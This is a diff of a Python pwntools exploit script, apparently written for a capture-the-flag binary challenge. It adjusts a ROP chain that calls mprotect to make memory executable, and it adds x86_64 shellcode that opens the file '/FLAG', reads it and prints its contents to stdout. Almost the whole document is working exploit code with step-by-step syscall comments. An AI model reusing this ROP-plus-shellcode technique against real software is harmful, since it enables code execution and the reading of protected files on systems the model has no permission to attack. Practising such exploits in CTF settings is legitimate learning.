@@ -130,7 +130,7 @@ def mprotect_read_byte():
         pop_rdi_ret,
         mprotect_address,
         pop_rsi_ret,
-        40960,
+        10*0x10000,
         pop_rdx_ret,
         7,
         syscall_ret,
@@ -188,11 +188,91 @@ def mprotect_read_byte():
 
 
 def get_asm_put_onto_codeint():
+    # put data start from codeint start + 5*0x10000, second half of codeint
+    FLAG_string_address = start_code_address + 5*0x10000
+    read_content_address = start_code_address + 5*0x10000 + 0x100  # 16 bytes is enough for "0x2f464c414700"
+    print("FLAG_string_address in hex str: ", str(hex(FLAG_string_address)))
+    print("read_content_address in hex str: ", str(hex(read_content_address)))
+
     send_line = flat(
+        # put /FLAG into codeint second half addr 
+        # 1. rdi - codeint second half addr
+        # 2. rax - /FLAG hex value with null terminator 00 (6 byte < 64 bits(x86_64 reg size))
+        #    0x2f464c414700
+        # 3. mov rax's value into rdi with 8 byte
+        #    -> *** qword ptr not qword ***
+        asm("mov rdi, " + str(hex(FLAG_string_address)) + "\n"),
+        asm("""mov rax, 0x0047414c462f
+        mov qword ptr [rdi], rax
+        """),
+        # mov r14, rdi
+
+        # write to see if the /FLAG is correctly 
+        # rax: write syscall number 1
+        # rdi: fd, stdout 1
+        # rsi: write the content from what address
+        # rdx: count, write 20 byte to stdout and end at null terminator
+        # asm("""mov rax, 1
+        # mov rdi, 1
+        # mov rsi, r14
+        # mov rdx, 20
+        # syscall
+        # """),
+
+        # open /FLAG file with O_RDONLY flag
+        # rax: open syscall number 2
+        # rdi: filename pointer - already set
+        # rsi: read-only flag
+        # rdx: no need to set
+        asm("""mov rax, 2
+        mov rsi, 0
+        syscall
+        """),
+        # mov rdi, r14
+
+        # save file descriptor return from open (in rax) to r9
+        asm("""mov r9, rax"""),
+
+        # read from the file descriptor
+        # rax: read syscall number 0
+        # rdi: fd, r9
+        # rsi: read content store into where
+        # rdx: count, read 200 byte (flag)
+        asm("""mov rax, 0
+        mov rdi, r9"""),
+        asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
+        asm("""mov rdx, 67
+        syscall
+        """),
+
+        # write the read content to stdout
+        # rax: write syscall number 1
+        # rdi: fd, stdout 1
+        # rsi: write the content from what address
+        # rdx: count, write 200 byte to stdout and end at null terminator
+        asm("""mov rax, 1
+        mov rdi, 1"""),
+        asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
+        asm("""mov rdx, 67
+        syscall
+        """),
+
+        # close file descriptor
+        # rax: open syscall number 3
+        # rdi: fd, r9
+        asm("""mov rax, 3
+        mov rdi, r9
+        syscall"""),
+
+        # exit 0
         asm("""mov rax, 60
         mov rdi, 0
         syscall""")
     )
+
+    disassembly = disasm(send_line) # Disassemble shellcode
+    print("disassembly:\n", disassembly)
+
     return send_line
 
 
@@ -240,11 +320,12 @@ if __name__ == '__main__':
     send_line_2 = get_asm_put_onto_codeint()
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
+    print("after send 2 - 1")
 
     # 2nd write codeint output
     print(r.recv())
 
-    print("after send 2")
+    print("after send 2 - 2")
 
     # print(r.recvline().decode())
     # print(r.recvline().decode())    
